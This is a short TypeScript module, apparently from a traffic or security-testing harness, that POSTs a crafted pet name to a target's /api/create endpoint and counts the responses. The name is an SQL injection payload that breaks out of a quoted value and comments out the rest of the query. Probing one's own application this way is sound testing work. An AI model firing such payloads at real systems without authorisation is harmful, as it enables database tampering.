import axios from 'axios';
import { SpecialRequest } from './types';

const CREATE_ENDPOINT = '/api/create';
const MALICIOUS_NAME = "Malicious Pet', 'Gru from the Minions') --";

export const createPetInjectionRequest: SpecialRequest = {
    name: 'Create pet SQL injection attempt',
    description: 'POST /api/create with crafted name payload',
    async execute({ targetUrl, metrics, headers }) {
        const requestUrl = new URL(CREATE_ENDPOINT, targetUrl).toString();

        metrics.incrementRequestCounter(requestUrl);

        try {
            const response = await axios.post(requestUrl, { name: MALICIOUS_NAME }, {
                timeout: 15000,
                headers,
            });

            metrics.incrementResponseStatusCounter(requestUrl, response.status);
            console.log(`[special-request] Successfully sent injection payload to ${requestUrl}`);
        } catch (error: unknown) {
            const status = axios.isAxiosError(error) && error.response ? error.response.status : 0;
            metrics.incrementResponseStatusCounter(requestUrl, status);
            const message = error instanceof Error ? error.message : String(error);
            console.error(`[special-request] Injection request failed for ${requestUrl}:`, message);
        }
    }
};
